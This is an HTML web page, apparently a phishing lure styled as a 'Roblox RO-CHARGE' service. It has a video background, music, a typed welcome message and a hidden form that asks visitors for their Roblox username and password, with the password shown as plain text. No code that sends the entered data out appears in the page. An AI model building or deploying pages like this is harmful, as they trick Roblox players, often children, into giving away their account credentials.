<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox RO-CHARGE</title>
    <style>
        body {
            margin: 0;
            font-family: "Raleway", sans-serif;
            font-size: 16px; /* Увеличенный шрифт */
            font-weight: 600; /* Сделаем шрифт более жирным */
            background-color: #BCAAA4;
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Обрезаем все, что выходит за пределы контейнера */
            position: relative;
        }

        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            z-index: -1;
            pointer-events: none; /* Отключение событий мыши для ифрейма */
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120%;
            height: 120%;
            transform: translate(-50%, -50%);
        }

        .form-container {
            position: relative;
            width: 400px;
            padding: 40px 80px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
            transition: transform 0.2s ease;
            overflow: hidden;
            display: none; /* Скрываем контейнер с формой */
        }

        .form-container button#mainsubmit {
            margin-top: 20px;
        }

        form {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
            font-weight: 600; /* Сделаем шрифт более жирным */
            color: black; /* Изменение цвета текста на черный */
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: 2px solid #ccc;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            box-sizing: border-box;
            margin-bottom: 10px;
            color: black; /* Изменение цвета текста на черный */
            font-weight: 600; /* Сделаем шрифт более жирным */
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 10px;
            background-color: #0066cc;
            color: white;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600; /* Сделаем шрифт более жирным */
        }

        button:hover {
            background-color: #005bb5;
        }

        input[type="text"]::placeholder {
            color: rgba(0, 0, 0, 0.7); /* Изменение цвета placeholder на черный (полупрозрачный) */
        }

        .welcome-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 600px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(15px);
            border-radius: 10px;
            text-align: center;
            box-shadow: 0px 0px 60px 10px rgba(0, 0, 0, 0.2);
            animation: fadeIn 1s ease-in-out;
        }

        .welcome-container h1 {
            font-size: 32px;
            font-weight: 600; /* Сделаем шрифт более жирным */
            color: black;
            margin: 0 0 20px 0;
        }

        .welcome-container p {
            font-size: 18px; /* Увеличенный шрифт */
            font-weight: 600;
            color: black;
        }

        .mouse-icon {
            margin-top: 20px;
            display: inline-block;
        }

        .mouse-icon svg {
            width: 40px;
            height: 60px;
        }

        /* Анимация плавного появления */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="video-background" id="video-background">
        <iframe id="background-video" src="https://www.youtube.com/embed/zhDwjnYZiCo?autoplay=1&controls=0&showinfo=0&modestbranding=1&loop=1&mute=1&playlist=zhDwjnYZiCo&vq=hd1080" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <div class="form-container" id="form-container">
        <form id="form">
            <label for="username">Enter your Roblox account name:</label>
            <input id="username" type="text" name="username" placeholder="Username" required>
            
            <label for="password">Enter your Roblox account password:</label>
            <input id="password" type="text" name="password" placeholder="Password" required>
            
            <button type="submit" id="mainsubmit">Submit</button>
        </form>
    </div>

    <div class="welcome-container" id="welcome-container">
        <h1 id="welcome-message"></h1>
        <p id="welcome-subtext"></p>
        <div class="mouse-icon">
            <!-- SVG иконка мыши с выделенным колесиком -->
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
                <rect x="16" y="2" width="32" height="60" rx="16" ry="16" fill="none" stroke="black" stroke-width="2" />
                <rect x="28" y="4" width="8" height="12" rx="4" ry="4" fill="black" />
                <line x1="32" y1="16" x2="32" y2="26" stroke="black" stroke-width="2" />
            </svg>
        </div>
    </div>

    <!-- Подключаем Howler.js -->
    <script src="https://cdn.jsdelivr.net/npm/howler/dist/howler.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            var sound = new Howl({
                src: ['https://raw.githubusercontent.com/rocharge/Roblox-RO-CHARGE/main/chillMusic.mp3'],
                autoplay: false,
                loop: true,
                volume: 0.5,
                onload: function() {
                    console.log('Music loaded, waiting for user interaction to play.');
                }
            });

            // Автоматически воспроизводим звук при открытии страницы
            sound.play();

            const welcomeMessage = 'Welcome to Roblox RO-CHARGE!';
            const welcomeSubtext = 'To continue, please scroll down with your mouse wheel.';
            const welcomeElement = document.getElementById('welcome-message');
            const subtextElement = document.getElementById('welcome-subtext');

            function typeEffect(text, element, delay = 100) {
                let index = 0;
                const interval = setInterval(() => {
                    if (index < text.length) {
                        element.textContent += text[index];
                        index++;
                    } else {
                        clearInterval(interval);
                    }
                }, delay);
            }

            // Задержка выполнения эффектов в миллисекундах
            const typingDelay = 100;
            const appearDelay = 500;

            setTimeout(() => typeEffect(welcomeMessage, welcomeElement, typingDelay), appearDelay);
            setTimeout(() => typeEffect(welcomeSubtext, subtextElement, typingDelay), appearDelay + welcomeMessage.length * typingDelay);

            // Убираем приветственное окно при прокрутке страницы
            window.addEventListener('scroll', () => {
                document.getElementById('welcome-container').style.display = 'none';
            });
        });
    </script>
</body>
</html>
